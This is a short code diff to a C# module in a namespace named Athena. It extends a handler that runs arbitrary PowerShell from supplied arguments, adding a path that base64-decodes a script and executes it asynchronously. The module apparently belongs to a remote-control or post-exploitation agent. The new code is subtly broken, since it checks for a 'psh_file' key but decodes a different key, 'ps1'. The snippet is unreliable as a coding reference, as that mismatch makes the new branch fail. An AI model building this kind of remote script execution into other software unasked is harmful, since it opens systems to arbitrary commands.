@@ -13,11 +13,21 @@ namespace Athena
             bool isSuccess = false;
             string resStr;
 
-            if (args.ContainsKey("command"))
+            if (args.ContainsKey("psh_command") || args.ContainsKey("psh_file"))
             {
                 using (PowerShell ps = PowerShell.Create())
                 {
-                    ps.AddScript((string)args["command"]);
+                    if (args.ContainsKey("psh_command") && (string)args["psh_command"]!="")
+                    {
+                        ps.AddScript((string)args["psh_command"]);
+                    }
+                    if (args.ContainsKey("psh_file") && (string)args["psh_file"] != "")
+                    {
+                        var base64EncodedBytes = Convert.FromBase64String((string)args["ps1"]);
+                        var psStr=Encoding.UTF8.GetString(base64EncodedBytes);
+                        ps.AddScript((string)psStr);
+                    }
+
                     try
                     {
                         var iAsyncResult = ps.BeginInvoke();
